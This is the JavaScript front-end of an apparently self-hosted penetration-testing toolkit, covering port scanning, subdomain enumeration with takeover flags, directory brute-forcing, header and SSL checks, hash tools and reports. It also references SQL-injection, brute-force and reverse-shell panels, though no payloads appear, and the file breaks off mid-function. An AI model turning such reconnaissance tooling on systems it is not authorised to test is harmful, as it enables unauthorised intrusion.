'use strict';

// ─── STATE ───────────────────────────────────────────────────────
let appState = { target_ip: '', target_domain: '', target_url: '', open_ports: [], subdomains: [] };
let activeSSE = null;

// ─── INIT ─────────────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', () => {
    setupNav();
    setupTheme();
    syncState().then(() => loadHomepage());
    checkConnectivity();
    window.addEventListener('online',  () => setConnStatus(true));
    window.addEventListener('offline', () => setConnStatus(false));
});

// ─── THEME ────────────────────────────────────────────────────────
function setupTheme() {
    const saved = localStorage.getItem('ct-theme') || 'dark';
    applyTheme(saved);
    document.getElementById('theme-toggle').addEventListener('click', () => {
        const current = document.documentElement.dataset.theme || 'dark';
        applyTheme(current === 'dark' ? 'light' : 'dark');
    });
}

function applyTheme(theme) {
    document.documentElement.dataset.theme = theme;
    localStorage.setItem('ct-theme', theme);
    const btn = document.getElementById('theme-toggle');
    if (btn) btn.textContent = theme === 'dark' ? '◐ LIGHT' : '◑ DARK';
}

// ─── NAVIGATION ───────────────────────────────────────────────────
function setupNav() {
    document.querySelectorAll('.nav-item').forEach(item => {
        item.addEventListener('click', e => {
            e.preventDefault();
            const tool = item.dataset.tool;

            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
            item.classList.add('active');

            document.querySelectorAll('.tool-panel').forEach(p => p.classList.remove('active'));
            const panel = document.getElementById(`tool-${tool}`);
            if (panel) panel.classList.add('active');

            if (tool === 'reports') { loadReports(); }
            else if (tool === 'home') { loadHomepage(); }
            else if (tool === 'logs') { loadLogs(); }
            else if (tool === 'wordlists') { loadWordlists(); }
            else { autoPopulate(tool); }
        });
    });
}

function navTo(tool) {
    const item = document.querySelector(`.nav-item[data-tool="${tool}"]`);
    if (item) item.click();
}

// ─── AUTO-POPULATE ─────────────────────────────────────────────────
function autoPopulate(tool) {
    const s = appState;
    const ip = s.target_ip;
    const domain = s.target_domain;
    const url = s.target_url || (ip ? `http://${ip}` : '');
    const target = domain || ip;

    const fill = (id, val) => {
        const el = document.getElementById(id);
        if (el && val && !el.value) el.value = val;
    };

    switch (tool) {
        case 'dns-lookup':    fill('dns-target', target); break;
        case 'subdomain-enum': fill('sub-target', domain); break;
        case 'headers':       fill('hdr-url', url); break;
        case 'dir-brute':     fill('dir-url', url); refreshWordlistSelects(); break;
        case 'port-scanner':  fill('ps-target', target); break;
        case 'web-brute':     fill('wb-url', url); refreshWordlistSelects(); break;
        case 'hash-crack':    refreshWordlistSelects(); break;
        case 'robots':        fill('rob-url', url); break;
        case 'sqli':          fill('sqli-url', url); break;
        case 'ssl':           fill('ssl-host', domain || ip); break;
        case 'revshell':      fill('rs-lhost', ip); break;
    }
}

// ─── STATE SYNC ────────────────────────────────────────────────────
async function syncState() {
    try {
        const r = await fetch('/api/state');
        appState = await r.json();
        renderStateBar();
    } catch (e) { /* ignore */ }
}


async function pushState(patch) {
    Object.assign(appState, patch);
    renderStateBar();
    try {
        await fetch('/api/state', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(patch)
        });
    } catch (e) { /* ignore */ }
}

// ─── LOGGING ───────────────────────────────────────────────────────
function logEvent(category, message) {
    const now = new Date();
    const ts  = now.toISOString().replace('T', ' ').slice(0, 19);
    const entry = `${ts} | ${category.toUpperCase().padEnd(12)} | ${message}`;
    fetch('/api/logs/append', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ entry })
    }).catch(() => {});
}

async function loadLogs() {
    const area    = el('log-area');
    const countEl = el('log-count');
    if (!area) return;
    try {
        const d = await (await fetch('/api/logs/read')).json();
        if (countEl) countEl.textContent = `${d.count} entr${d.count !== 1 ? 'ies' : 'y'}`;
        if (!d.lines.length) {
            area.innerHTML = '<div class="results-placeholder">No log entries yet.</div>';
            return;
        }
        const catClass = cat => {
            const c = cat.toLowerCase().replace(/[\s-]+/g, '-');
            return `log-cat-${c}`;
        };
        area.innerHTML = d.lines.slice().reverse().map(line => {
            const parts = line.split(' | ');
            if (parts.length < 3) return `<div class="log-line"><span class="log-ts">${esc(line)}</span></div>`;
            const [ts, cat, ...rest] = parts;
            const msg = rest.join(' | ');
            const isFound = /OPEN|FOUND|SUCCESS/i.test(msg);
            const isErr   = /ERROR|FAIL|CRITICAL/i.test(msg);
            const rowCls  = isFound ? 'log-found' : isErr ? 'log-error' : '';
            return `<div class="log-line ${rowCls}">
                <span class="log-ts">${esc(ts)}</span>
                <span class="log-cat ${catClass(cat.trim())}">[${esc(cat.trim())}]</span>
                <span>${esc(msg)}</span>
            </div>`;
        }).join('');
    } catch (e) {
        area.innerHTML = '<div class="results-placeholder">Could not load logs.</div>';
    }
}

async function clearLogs() {
    showConfirm('Clear the entire activity log?', async () => {
        await fetch('/api/logs/clear', { method: 'POST' });
        logEvent('SYSTEM', 'Log cleared by user');
        toast('Log cleared');
        loadLogs();
    });
}

// ─── CONNECTIVITY ──────────────────────────────────────────────────
async function checkConnectivity() {
    try {
        const r = await fetch('/api/connectivity');
        const d = await r.json();
        setConnStatus(d.online);
    } catch (e) {
        setConnStatus(false);
    }
    setTimeout(checkConnectivity, 30000);
}

function setConnStatus(online) {
    const ind = el('conn-indicator');
    const lbl = el('conn-label');
    if (!ind) return;
    ind.classList.toggle('online', online);
    ind.classList.toggle('offline', !online);
    if (lbl) lbl.textContent = online ? 'ONLINE' : 'OFFLINE';
}

// ─── HOMEPAGE ──────────────────────────────────────────────────────
async function loadHomepage() {
    const s = appState;
    const ipEl     = el('hstat-ip');
    const domEl    = el('hstat-domain');
    const portsEl  = el('hstat-ports');
    const rptEl    = el('hstat-reports');
    const recentEl = el('home-recent');

    if (ipEl)    ipEl.textContent    = s.target_ip || '—';
    if (domEl)   domEl.textContent   = s.target_domain || '—';
    if (portsEl) portsEl.textContent = s.open_ports?.length || '0';

    try {
        const files = await (await fetch('/api/reports/list')).json();
        if (rptEl) rptEl.textContent = files.length;

        if (recentEl) {
            if (!files.length) {
                recentEl.innerHTML = '<div class="results-placeholder">No reports saved yet.</div>';
            } else {
                recentEl.innerHTML = files.slice(0, 6).map(f => `
                    <div class="report-row" style="cursor:pointer" onclick="navTo('reports')">
                        <span class="report-name">${esc(f)}</span>
                        <span style="font-family:var(--mono);font-size:11px;color:var(--accent-dim);flex-shrink:0">VIEW →</span>
                    </div>
                `).join('');
            }
        }
    } catch (e) { /* ignore */ }
}

function renderStateBar() {
    const s = appState;

    const setChip = (chipId, val, label) => {
        const chip = document.getElementById(chipId);
        if (!chip) return;
        const valEl = chip.querySelector('.state-chip-val');
        if (val) {
            valEl.textContent = val;
            chip.classList.add('has-value');
            chip.dataset.copy = val;
        } else {
            valEl.textContent = '—';
            chip.classList.remove('has-value');
            chip.dataset.copy = '';
        }
    };

    setChip('chip-ip', s.target_ip, 'IP');
    setChip('chip-domain', s.target_domain, 'Domain');

    // Keep home stats in sync
    const ipEl    = el('hstat-ip');    if (ipEl)    ipEl.textContent    = s.target_ip || '—';
    const domEl   = el('hstat-domain');if (domEl)   domEl.textContent   = s.target_domain || '—';
    const prtEl   = el('hstat-ports'); if (prtEl)   prtEl.textContent   = s.open_ports?.length || '0';

    const portsText = s.open_ports.length
        ? s.open_ports.map(p => p.port).slice(0, 8).join(', ') + (s.open_ports.length > 8 ? '…' : '')
        : '';
    setChip('chip-ports', portsText, 'Ports');
}

// ─── PORT SCANNER ──────────────────────────────────────────────────
document.getElementById('ps-scan-btn').addEventListener('click', startPortScan);
document.getElementById('ps-stop-btn').addEventListener('click', stopSSE);

function setPortsPreset(preset) {
    const presets = {
        top100: 'top100',
        common: '21,22,23,25,53,80,110,135,139,143,443,445,1433,1521,3306,3389,5432,5900,6379,8080,8443,27017',
        full: '1-65535'
    };
    document.getElementById('ps-ports').value = presets[preset] || preset;
}

function startPortScan() {
    const target  = document.getElementById('ps-target').value.trim();
    const ports   = document.getElementById('ps-ports').value.trim() || '1-1024';
    const threads = document.getElementById('ps-threads').value || '100';

    // Fix #21: input validation messages
    if (!target) { showInputError('ps-target', 'Enter a target IP or hostname'); return; }

    logEvent('PORT-SCAN', `Started scan on ${target} — ports ${ports}, threads ${threads}`);
    stopSSE();

    const results = document.getElementById('ps-results');
    results.innerHTML = '';
    el('ps-progress').classList.remove('hidden');
    el('ps-actions').classList.add('hidden');
    el('ps-scan-btn').disabled = true;
    el('ps-stop-btn').classList.remove('hidden');

    let openCount = 0;
    const scanStart = Date.now();  // Fix #22: ETA tracking

    activeSSE = new EventSource(
        `/api/ports/scan?target=${enc(target)}&ports=${enc(ports)}&threads=${enc(threads)}`
    );

    activeSSE.onmessage = e => {
        const d = JSON.parse(e.data);

        if (d.type === 'info') {
            results.insertAdjacentHTML('beforeend', `<div class="log-info">${esc(d.message)}</div>`);
        } else if (d.type === 'open') {
            openCount++;
            logEvent('PORT-SCAN', `OPEN ${d.port}/${d.service} on ${target}${d.banner ? ' — ' + d.banner.slice(0,80) : ''}`);
            const banner = d.banner ? `<span class="r-banner" title="${esc(d.banner)}">${esc(d.banner)}</span>` : '<span class="r-banner"></span>';
            const rowId  = `port-row-${d.port}`;
            results.insertAdjacentHTML('beforeend', `
                <div class="r-row r-open" id="${rowId}">
                    <span class="r-port r-port-clickable" id="vuln-btn-${d.port}" onclick="toggleVuln(${d.port}, '${esc(d.service)}')" title="Click to check vulnerabilities for this port">${d.port}</span>
                    <span class="r-svc">${esc(d.service)}</span>
                    ${banner}
                    <button class="copy-inline" onclick="copyText('${d.port}/${esc(d.service)}')">COPY</button>
                </div>
                <div id="vuln-panel-${d.port}" class="hidden"></div>
            `);
            results.scrollTop = results.scrollHeight;
        } else if (d.type === 'progress') {
            // Fix #22: calculate and display ETA
            const elapsed = (Date.now() - scanStart) / 1000;
            const rate = d.scanned / (elapsed || 0.001);
            const remaining = d.total - d.scanned;
            const eta = rate > 0 && remaining > 0 ? Math.round(remaining / rate) : null;
            const etaStr = eta !== null ? ` · ETA ${eta}s` : '';
            setProgress('ps', d.percent, `${d.percent}%  ${d.scanned}/${d.total} ports${etaStr}`);
        } else if (d.type === 'error') {
            results.insertAdjacentHTML('beforeend', `<div class="log-error">${esc(d.message)}</div>`);
        } else if (d.type === 'complete') {
            setProgress('ps', 100, `Done — ${d.open_ports.length} open port${d.open_ports.length !== 1 ? 's' : ''} found`);
            logEvent('PORT-SCAN', `Complete — ${d.open_ports.length} open port(s) on ${d.ip}`);
            pushState({ target_ip: d.ip, open_ports: d.open_ports });
            el('ps-actions').classList.remove('hidden');
            buildNmapSection(d.ip, d.open_ports);
            scanDone('ps');
        } else if (d.type === 'done') {
            scanDone('ps');
        }
    };

    activeSSE.onerror = () => scanDone('ps');
}

// ─── DNS LOOKUP ────────────────────────────────────────────────────
document.getElementById('dns-lookup-btn').addEventListener('click', dnsLookup);

async function dnsLookup() {
    const target = document.getElementById('dns-target').value.trim();
    if (!target) { showInputError('dns-target', 'Enter a domain or IP address'); return; }

    logEvent('DNS', `Lookup started for ${target}`);
    const results = el('dns-results');
    results.innerHTML = '<div class="log-info">Looking up...</div>';
    el('dns-lookup-btn').disabled = true;
    el('dns-actions').classList.add('hidden');

    try {
        const r = await post('/api/dns/lookup', { target });

        if (r.error) { results.innerHTML = `<div class="log-error">${esc(r.error)}</div>`; return; }

        results.innerHTML = '';

        if (r.ip)          dnsRow(results, 'IP Address', r.ip, true);
        if (r.reverse_dns) dnsRow(results, 'Reverse DNS', r.reverse_dns, true);

        if (r.all_ips && r.all_ips.length > 1)
            dnsRow(results, 'All IPs', r.all_ips.join(', '), false);

        if (r.mx_records && r.mx_records.length)
            dnsRow(results, 'MX Records', r.mx_records.join('\n'), false);

        if (r.ns_records && r.ns_records.length)
            dnsRow(results, 'NS Records', r.ns_records.join(', '), false);

        if (r.whois) {
            const w = r.whois;
            if (w.registrar)        dnsRow(results, 'Registrar', w.registrar, false);
            if (w.org)              dnsRow(results, 'Organization', w.org, false);
            if (w.country)          dnsRow(results, 'Country', w.country, false);
            if (w.creation_date)    dnsRow(results, 'Created', w.creation_date, false);
            if (w.expiration_date)  dnsRow(results, 'Expires', w.expiration_date, false);
            if (w.updated_date)     dnsRow(results, 'Updated', w.updated_date, false);
            if (w.status)           dnsRow(results, 'Status', w.status, false);
            if (w.name_servers && w.name_servers.length)
                dnsRow(results, 'Name Servers', w.name_servers.join(', '), false);
        } else {
            dnsRow(results, 'WHOIS', 'Not available (install python-whois)', false);
        }

        logEvent('DNS', `Complete — ${target} resolves to ${r.ip || '?'}${r.reverse_dns ? ', reverse: ' + r.reverse_dns : ''}`);
        window._lastDnsData = r;
        pushState({ target_ip: r.ip || '', target_domain: r.is_ip_input ? '' : target });
        el('dns-actions').classList.remove('hidden');
    } catch (e) {
        results.innerHTML = `<div class="log-error">[!] Request failed: ${esc(e.message)}</div>`;
    } finally {
        el('dns-lookup-btn').disabled = false;
    }
}

function dnsRow(container, label, value, copyable) {
    container.insertAdjacentHTML('beforeend', `
        <div class="dns-row">
            <span class="dns-label">${label}</span>
            <span class="dns-val">${esc(value)}</span>
            ${copyable ? `<button class="copy-inline" onclick="copyText(${JSON.stringify(value)})">COPY</button>` : ''}
        </div>
    `);
}

// ─── SUBDOMAIN ENUM ─────────────────────────────────────────────────
document.getElementById('sub-scan-btn').addEventListener('click', startSubScan);
document.getElementById('sub-stop-btn').addEventListener('click', stopSSE);

function startSubScan() {
    const target = document.getElementById('sub-target').value.trim();
    if (!target) { showInputError('sub-target', 'Enter a domain (e.g. example.com)'); return; }

    logEvent('SUBDOMAIN', `Enumeration started for ${target}`);
    stopSSE();

    const results = el('sub-results');
    results.innerHTML = '';
    el('sub-progress').classList.remove('hidden');
    el('sub-actions').classList.add('hidden');
    el('sub-scan-btn').disabled = true;
    el('sub-stop-btn').classList.remove('hidden');

    const subStart = Date.now();
    const customWl = el('sub-wordlist') ? el('sub-wordlist').value : '';

    activeSSE = new EventSource(`/api/subdomains/scan?target=${enc(target)}${customWl ? '&wordlist=' + enc(customWl) : ''}`);

    activeSSE.onmessage = e => {
        const d = JSON.parse(e.data);

        if (d.type === 'info') {
            results.insertAdjacentHTML('beforeend', `<div class="log-info">${esc(d.message)}</div>`);
        } else if (d.type === 'found') {
            logEvent('SUBDOMAIN', `FOUND ${d.subdomain} → ${d.ip}${d.takeover ? ' [TAKEOVER: ' + d.takeover + ']' : ''}`);
            const takeoverBadge = d.takeover
                ? `<span style="font-family:var(--mono);font-size:11px;color:var(--red);font-weight:700;margin-left:6px" title="${esc(d.takeover)}">⚠ ${esc(d.takeover)}</span>`
                : '';
            results.insertAdjacentHTML('beforeend', `
                <div class="r-row r-found">
                    <span class="r-url">${esc(d.subdomain)}</span>
                    <span class="r-ip">${esc(d.ip)}</span>
                    ${takeoverBadge}
                    <button class="copy-inline" onclick="copyText('${esc(d.subdomain)}')">COPY</button>
                </div>
            `);
            results.scrollTop = results.scrollHeight;
        } else if (d.type === 'progress') {
            // Fix #22: ETA for subdomain scan
            const elapsed = (Date.now() - subStart) / 1000;
            const rate = d.checked / (elapsed || 0.001);
            const remaining = d.total - d.checked;
            const eta = rate > 0 && remaining > 0 ? Math.round(remaining / rate) : null;
            const etaStr = eta !== null ? ` · ETA ${eta}s` : '';
            setProgress('sub', d.percent, `${d.percent}%  ${d.checked}/${d.total}${etaStr}`);
        } else if (d.type === 'error') {
            results.insertAdjacentHTML('beforeend', `<div class="log-error">${esc(d.message)}</div>`);
        } else if (d.type === 'complete') {
            setProgress('sub', 100, `Done — ${d.found.length} subdomain${d.found.length !== 1 ? 's' : ''} found`);
            logEvent('SUBDOMAIN', `Complete — ${d.found.length} subdomain(s) found for ${target}`);
            pushState({ subdomains: d.found, target_domain: target });
            el('sub-actions').classList.remove('hidden');
            scanDone('sub');
        } else if (d.type === 'done') {
            scanDone('sub');
        }
    };

    activeSSE.onerror = () => scanDone('sub');
}

// ─── HEADER ANALYZER ───────────────────────────────────────────────
document.getElementById('hdr-analyze-btn').addEventListener('click', analyzeHeaders);

async function analyzeHeaders() {
    const url = document.getElementById('hdr-url').value.trim();
    if (!url) { showInputError('hdr-url', 'Enter a URL (e.g. https://example.com)'); return; }

    logEvent('HEADERS', `Analysis started for ${url}`);
    const results = el('hdr-results');
    results.innerHTML = '<div class="log-info">Analyzing headers...</div>';
    el('hdr-analyze-btn').disabled = true;
    el('hdr-actions').classList.add('hidden');

    try {
        const d = await post('/api/headers/analyze', { url });

        if (d.error) { results.innerHTML = `<div class="log-error">[!] ${esc(d.error)}</div>`; return; }

        results.innerHTML = `
            <div class="score-bar">
                <div class="score-grade score-grade-${d.grade}">${d.grade}</div>
                <div class="score-info">
                    <div class="score-title">${d.score}/${d.max_score} security headers present</div>
                    <div class="score-sub">${esc(d.url)} &nbsp;·&nbsp; HTTP ${d.status_code}${d.resolved_ip ? ' &nbsp;·&nbsp; ' + esc(d.resolved_ip) : ''}</div>
                </div>
                <button class="copy-inline" onclick="copyText(${JSON.stringify(d.url)})">COPY URL</button>
            </div>
        `;

        d.headers.forEach(h => {
            const iconMap = { good: '✓', missing: '✗', warn: '⚠', optional: '–' };
            const clsMap  = { good: 'hdr-icon-good', missing: 'hdr-icon-missing', warn: 'hdr-icon-warn', optional: 'hdr-icon-optional' };
            const icon = iconMap[h.status] || '–';
            const cls  = clsMap[h.status] || 'hdr-icon-optional';
            results.insertAdjacentHTML('beforeend', `
                <div class="hdr-row">
                    <div class="hdr-top">
                        <span class="${cls}">${icon}</span>
                        <span class="hdr-name">${esc(h.header)}</span>
                        ${h.value ? `<button class="copy-inline" onclick="copyText(${JSON.stringify(h.value)})">COPY</button>` : ''}
                    </div>
                    ${h.value ? `<div class="hdr-value">${esc(h.value)}</div>` : ''}
                    <div class="hdr-desc">${esc(h.description)}</div>
                    <div class="hdr-rec text-muted">Recommended: ${esc(h.recommended)}</div>
                </div>
            `);
        });

        logEvent('HEADERS', `Complete — grade ${d.grade}, score ${d.score}/${d.max_score} for ${d.url}`);
        window._lastHeaderData = d;
        pushState({ target_url: d.url });
        el('hdr-actions').classList.remove('hidden');
    } catch (e) {
        results.innerHTML = `<div class="log-error">[!] ${esc(e.message)}</div>`;
    } finally {
        el('hdr-analyze-btn').disabled = false;
    }
}

// ─── SSL INSPECTOR ─────────────────────────────────────────────────
document.getElementById('ssl-inspect-btn').addEventListener('click', inspectSSL);

async function inspectSSL() {
    const host = el('ssl-host').value.trim();
    if (!host) { showInputError('ssl-host', 'Enter a hostname or IP'); return; }
    const port = parseInt(el('ssl-port').value) || 443;

    logEvent('SSL', `Inspecting ${host}:${port}`);
    const results = el('ssl-results');
    results.innerHTML = '<div class="log-info">Connecting...</div>';
    el('ssl-inspect-btn').disabled = true;
    el('ssl-actions').classList.add('hidden');

    try {
        const d = await post('/api/ssl/inspect', { host, port });

        if (d.error) {
            results.innerHTML = `<div class="log-error">[!] ${esc(d.error)}</div>`;
            return;
        }

        const statusCls = {
            valid: 'hdr-icon-good',
            expiring_soon: 'hdr-icon-warn',
            expired: 'hdr-icon-missing',
            unknown: 'hdr-icon-optional'
        }[d.expiry_status] || 'hdr-icon-optional';

        const statusIcon = { valid: '✓', expiring_soon: '⚠', expired: '✗', unknown: '–' }[d.expiry_status] || '–';
        const daysText = d.days_until_expiry != null
            ? (d.days_until_expiry < 0 ? `Expired ${Math.abs(d.days_until_expiry)} days ago` : `${d.days_until_expiry} days remaining`)
            : '';

        results.innerHTML = `
            <div class="score-bar">
                <div class="score-grade ${statusCls}" style="font-size:22px;width:44px;height:44px">${statusIcon}</div>
                <div class="score-info">
                    <div class="score-title">${esc(d.subject?.cn || host)}${d.self_signed ? ' &nbsp;<span style="color:var(--accent-warn);font-size:12px">[SELF-SIGNED]</span>' : ''}</div>
                    <div class="score-sub">${esc(d.host)}:${d.port} &nbsp;·&nbsp; ${esc(d.protocol || '?')} &nbsp;·&nbsp; ${daysText}</div>
                </div>
            </div>`;

        const row = (label, val, warn) => {
            if (!val) return;
            results.insertAdjacentHTML('beforeend', `
                <div class="dns-row">
                    <span class="dns-label">${label}</span>
                    <span class="dns-val${warn ? ' log-warn' : ''}">${esc(String(val))}</span>
                </div>`);
        };

        row('Common Name',   d.subject?.cn);
        row('Organization',  d.subject?.org);
        row('Country',       d.subject?.country);
        row('Issuer CN',     d.issuer?.cn);
        row('Issuer Org',    d.issuer?.org);
        row('Valid From',    d.not_before);
        row('Valid Until',   d.not_after);
        row('Days Left',     daysText, d.expiry_status !== 'valid');
        if (d.sans?.length) row('SANs', d.sans.join(', '));
        row('Protocol',      d.protocol, ['SSLv2','SSLv3','TLSv1','TLSv1.1'].includes(d.protocol));
        if (d.cipher) row('Cipher', `${d.cipher[0]} (${d.cipher[2]} bit)`);

        if (d.warnings?.length) {
            d.warnings.forEach(w => {
                results.insertAdjacentHTML('beforeend',
                    `<div class="log-warn" style="margin:4px 0">⚠ ${esc(w)}</div>`);
            });
        }

        logEvent('SSL', `${host}:${port} — ${d.protocol}, expires ${d.not_after}, ${d.days_until_expiry ?? '?'} days left`);
        window._lastSSLData = d;
        el('ssl-actions').classList.remove('hidden');
    } catch (e) {
        results.innerHTML = `<div class="log-error">[!] ${esc(e.message)}</div>`;
    } finally {
        el('ssl-inspect-btn').disabled = false;
    }
}

// ─── DIR BRUTE FORCE ───────────────────────────────────────────────
document.getElementById('dir-scan-btn').addEventListener('click', startDirScan);
document.getElementById('dir-stop-btn').addEventListener('click', stopSSE);

function startDirScan() {
    const url = document.getElementById('dir-url').value.trim();
    if (!url) { showInputError('dir-url', 'Enter a base URL (e.g. http://192.168.1.1)'); return; }

    const extensions = (el('dir-extensions') ? el('dir-extensions').value.trim() : '');
    const customWl   = (el('dir-wordlist') ? el('dir-wordlist').value : '');
    const recursive  = (el('dir-recursive') ? el('dir-recursive').checked : false);
    const depth      = (el('dir-depth') ? el('dir-depth').value : '2');

    let apiUrl = `/api/dirs/scan?url=${enc(url)}`;
    if (extensions) apiUrl += `&extensions=${enc(extensions)}`;
    if (customWl)   apiUrl += `&wordlist=${enc(customWl)}`;
    if (recursive)  apiUrl += `&recursive=true&depth=${enc(depth)}`;

    logEvent('DIR-BRUTE', `Scan started for ${url}${recursive ? ' (recursive depth ' + depth + ')' : ''}`);
    stopSSE();

    const results = el('dir-results');
    results.innerHTML = '';
    el('dir-progress').classList.remove('hidden');
    el('dir-actions').classList.add('hidden');
    el('dir-scan-btn').disabled = true;
    el('dir-stop-btn').classList.remove('hidden');

    const dirStart = Date.now();
    activeSSE = new EventSource(apiUrl);

    activeSSE.onmessage = e => {
        const d = JSON.parse(e.data);

        if (d.type === 'info') {
            results.insertAdjacentHTML('beforeend', `<div class="log-info">${esc(d.message)}</div>`);
        } else if (d.type === 'found') {
            logEvent('DIR-BRUTE', `FOUND ${d.url} → HTTP ${d.status}`);
            const cls = statusClass(d.status);
            results.insertAdjacentHTML('beforeend', `
                <div class="r-row r-found">
                    <span class="r-status ${cls}">${d.status}</span>
                    <span class="r-url">${esc(d.url)}</span>
                    <span class="r-size">${fmtSize(d.size)}</span>
                    <button class="copy-inline" onclick="copyText(${JSON.stringify(d.url)})">COPY</button>
                </div>
            `);
            results.scrollTop = results.scrollHeight;
        } else if (d.type === 'progress') {
            // Fix #22: ETA for dir scan
            const elapsed = (Date.now() - dirStart) / 1000;
            const rate = d.checked / (elapsed || 0.001);
            const remaining = d.total - d.checked;
            const eta = rate > 0 && remaining > 0 ? Math.round(remaining / rate) : null;
            const etaStr = eta !== null ? ` · ETA ${eta}s` : '';
            setProgress('dir', d.percent, `${d.percent}%  ${d.checked}/${d.total} paths${etaStr}`);
        } else if (d.type === 'error') {
            results.insertAdjacentHTML('beforeend', `<div class="log-error">${esc(d.message)}</div>`);
        } else if (d.type === 'complete') {
            setProgress('dir', 100, `Done — ${d.found.length} path${d.found.length !== 1 ? 's' : ''} found`);
            logEvent('DIR-BRUTE', `Complete — ${d.found.length} path(s) found on ${url}`);
            window._lastDirData = d.found;
            el('dir-actions').classList.remove('hidden');
            scanDone('dir');
        } else if (d.type === 'done') {
            scanDone('dir');
        }
    };

    activeSSE.onerror = () => scanDone('dir');
}

// ─── HASH TOOLS ─────────────────────────────────────────────────────
document.getElementById('hash-identify-btn').addEventListener('click', identifyHash);

async function identifyHash() {
    const hash = document.getElementById('hash-input').value.trim();
    if (!hash) { toast('Enter a hash'); return; }

    logEvent('HASH', `Identify hash — length ${hash.length}: ${hash.slice(0, 32)}${hash.length > 32 ? '…' : ''}`);
    const d = await post('/api/hash/identify', { hash });
    const results = el('hash-results');

    results.innerHTML = `
        <div class="dns-row">
            <span class="dns-label">Hash</span>
            <span class="dns-val" style="word-break:break-all">${esc(d.hash)}</span>
            <button class="copy-inline" onclick="copyText(${JSON.stringify(d.hash)})">COPY</button>
        </div>
        <div class="dns-row">
            <span class="dns-label">Length</span>
            <span class="dns-val">${d.length} chars &nbsp;·&nbsp; ${d.char_type}</span>
        </div>
        <div class="dns-row">
            <span class="dns-label">Type(s)</span>
            <span class="dns-val">${d.possible_types.map(t => `<span class="hash-tag">${esc(t)}</span>`).join('')}</span>
        </div>
    `;
}

async function generateHash(algo) {
    const text = document.getElementById('hash-input').value;
    if (!text) { toast('Enter text to hash'); return; }

    logEvent('HASH', `Generate ${algo.toUpperCase()} hash`);
    const d = await post('/api/encode', { text, operation: 'encode', encoding: algo });
    if (d.error) { toast(d.error); return; }

    el('hash-results').innerHTML = `
        <div class="dns-row">
            <span class="dns-label">${algo.toUpperCase()}</span>
            <span class="dns-val" style="word-break:break-all">${esc(d.result)}</span>
            <button class="copy-inline" onclick="copyText(${JSON.stringify(d.result)})">COPY</button>
        </div>
    `;
}

// ─── ENCODER / DECODER ──────────────────────────────────────────────
async function runEncode(op) {
    const text     = document.getElementById('enc-input').value;
    const encoding = document.getElementById('enc-format').value;

    logEvent('ENCODER', `${op === 'encode' ? 'Encode' : 'Decode'} using ${encoding}`);
    const d = await post('/api/encode', { text, operation: op, encoding });
    const results = el('enc-results');

    if (d.error) {
        results.innerHTML = `<div class="log-error">[!] ${esc(d.error)}</div>`;
        return;
    }

    results.innerHTML = `
        <div style="display:flex;align-items:flex-start;gap:10px;padding:10px 12px;border-bottom:1px solid var(--border-2)">
            <span class="text-muted mono" style="font-size:9px;letter-spacing:1px;text-transform:uppercase;padding-top:2px;min-width:60px">${op === 'encode' ? 'Encoded' : 'Decoded'}</span>
            <span class="enc-result" style="flex:1;padding:0">${esc(d.result)}</span>
            <button class="copy-inline" onclick="copyText(${JSON.stringify(d.result)})">COPY</button>
        </div>
    `;
}

function swapEncDec() {
    const encResult = el('enc-results');
    const pre = encResult.querySelector('.enc-result');
    if (pre) {
        document.getElementById('enc-input').value = pre.textContent;
        encResult.innerHTML = '<div class="results-placeholder">Swapped to input field.</div>';
    }
}

// ─── REPORTS ────────────────────────────────────────────────────────
async function loadReports() {
    try {
        const files = await (await fetch('/api/reports/list')).json();
        const container = el('reports-list');

        if (!files.length) {
            container.innerHTML = '<div class="results-placeholder">No reports saved yet. Use "Save Report" on any scan tool.</div>';
            return;
        }

        container.innerHTML = files.map(f => `
            <div class="report-row" id="rrow-${esc(f)}">
                <span class="report-name" onclick="viewReport('${esc(f)}')" style="cursor:pointer;flex:1">${esc(f)}</span>
                <button class="copy-inline" onclick="viewReport('${esc(f)}')">VIEW</button>
                <button class="copy-inline" style="border-color:rgba(255,68,85,0.35);color:var(--red)" onclick="deleteReport('${esc(f)}')">DELETE</button>
            </div>
        `).join('');
    } catch (e) { /* ignore */ }
}

function showConfirm(msg, onYes) {
    const overlay = el('confirm-modal');
    el('confirm-msg').textContent = msg;
    overlay.classList.remove('hidden');

    const yes = el('confirm-yes');
    const no  = el('confirm-no');

    const cleanup = () => overlay.classList.add('hidden');
    yes.onclick = () => { cleanup(); onYes(); };
    no.onclick  = cleanup;
    overlay.onclick = e => { if (e.target === overlay) cleanup(); };
}

async function deleteAllReports() {
    showConfirm('Delete ALL reports? This cannot be undone.', async () => {
        try {
            const r = await post('/api/reports/delete-all', {});
            logEvent('REPORTS', `Deleted all reports — ${r.deleted} file(s) removed`);
            toast(`Deleted ${r.deleted} report${r.deleted !== 1 ? 's' : ''}`);
            loadReports();
            loadHomepage();
        } catch (e) { toast('Delete failed'); }
    });
}

async function deleteReport(filename) {
    showConfirm(`Delete this report?\n\n${filename}`, async () => {
        try {
            await post('/api/reports/delete', { filename });
            logEvent('REPORTS', `Deleted report: ${filename}`);
            const row = el(`rrow-${filename}`);
            if (row) row.remove();
            toast('Report deleted');
            const container = el('reports-list');
            if (!container.querySelector('.report-row')) {
                container.innerHTML = '<div class="results-placeholder">No reports saved yet. Use "Save Report" on any scan tool.</div>';
            }
        } catch (e) { toast('Delete failed'); }
    });
}

async function viewReport(filename) {
    try {
        const d = await (await fetch(`/api/reports/${encodeURIComponent(filename)}`)).json();
        const container = el('reports-list');
        container.style.maxHeight = 'none';

        const mdName   = filename.replace(/\.json$/, '.md');
        const htmlName = filename.replace(/\.json$/, '.html');
        const backBtn = `<div style="padding:10px 14px;border-bottom:1px solid var(--border);display:flex;gap:8px;align-items:center;flex-wrap:wrap">
            <button class="btn btn-ghost" style="font-size:13px" onclick="loadReports()">← Back</button>
            <a class="btn btn-ghost" style="font-size:13px;text-decoration:none" href="/api/reports/export-md/${encodeURIComponent(filename)}" download="${esc(mdName)}">Download .md</a>
            <a class="btn btn-ghost" style="font-size:13px;text-decoration:none" href="/api/reports/export-html/${encodeURIComponent(filename)}" download="${esc(htmlName)}">Download .html</a>
        </div>`;

        container.innerHTML = backBtn + renderExecReport(d, filename);
    } catch (e) { toast('Could not load report'); }
}

function renderExecReport(d, filename) {
    const tool      = d.tool || 'unknown';
    const ts        = d.timestamp ? new Date(d.timestamp).toLocaleString() : '—';
